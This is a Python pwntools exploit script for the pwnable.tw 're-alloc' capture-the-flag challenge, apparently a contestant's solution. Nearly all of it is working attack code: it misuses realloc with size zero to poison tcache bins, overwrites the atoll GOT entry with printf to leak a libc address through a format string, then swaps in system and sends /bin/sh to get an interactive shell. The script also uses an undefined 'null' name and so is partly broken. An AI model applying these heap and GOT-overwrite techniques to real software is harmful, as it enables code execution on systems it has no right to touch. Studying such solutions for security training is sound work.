from pwn import *

####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './re-alloc_patched'
LIBC = ELF('./libc.so.6')  # Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN)  # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)  # Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)  # Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw', 10106)  # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)  # Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)  # Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid, '''b*rfree
    b *reallocate
    b* 0x0040133c''')


#####################
#### Find Gadgets ###
#####################


# MAIN_PLT = ELF_LOADED.symbols['main']
# POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0]  # Same as ROPgadget --binary vuln | grep 'pop rdi'
# RET = (ROP_LOADED.find_gadget(['ret']))[0]
#
# log.info('Main start: ' + hex(MAIN_PLT))
# log.info('pop rdi; ret  gadget: ' + hex(POP_RDI))
# log.info('ret gadget: ' + hex(RET))


#########################
#### Finf LIBC offset ###
#########################


##########################
##### FUNCTION ######
##########################

def alloc(index, size, data):
    P.sendlineafter(b'choice:', b'1')
    P.sendlineafter(b'Index:', index)
    P.sendlineafter(b'Size:', size)
    P.sendlineafter(b'Data:', data)


def realloc(index, size, data):
    P.sendlineafter(b'choice:', b'2')
    P.sendlineafter(b'Index:', index)
    P.sendlineafter(b'Size:', size)
    if data != null:
        P.sendlineafter(b'Data:', data)


def free(index):
    P.sendlineafter(b'choice:', b'3')
    P.sendlineafter(b'Index:', index)


def prepareArbitraryWrite(binSize, address):
    # allocate a chunk from binSize
    alloc(b'1', str(binSize).encode(), b'')
    # free vuln from realloc
    realloc(b'1', b'0', null)
    # now that the chunk is in binSize Tcache bin, realloc to another size will change the pointer of it
    realloc(b'1', str(binSize + 0x10).encode(), address)
    # we need to get the chunk out, so the next chunk from the binSize tcache will be our target
    alloc(b'0', str(binSize).encode(), b'')
    # now we can free index 1
    free(b'1')
    # resize index 0 so that the chunk won't end up in the binSize tcache
    realloc(b'0', str(binSize +0x20).encode(), address)
    free(b'0')



##############################
##### FINAL EXPLOITATION #####
##############################

prepareArbitraryWrite(0x10, p64(ELF_LOADED.got['atoll']))
prepareArbitraryWrite(0x40, p64(ELF_LOADED.got['atoll']))

# now write atoll -> printf
alloc(b'0', str(0x40).encode(), p64(ELF_LOADED.plt['printf']))
P.sendlineafter(b'choice:', b'1')
P.sendlineafter(b'Index:', b'%3$p')
leak = P.recvuntil(b'Invalid').strip(b'Invalid')
LIBC.address = int(leak,16) - 0x12e009
print(hex(LIBC.address))


alloc(b'', b'A'*0xf, p64(LIBC.sym['system']))
P.sendline(b'1')
P.sendline(b'/bin/sh')

P.interactive()
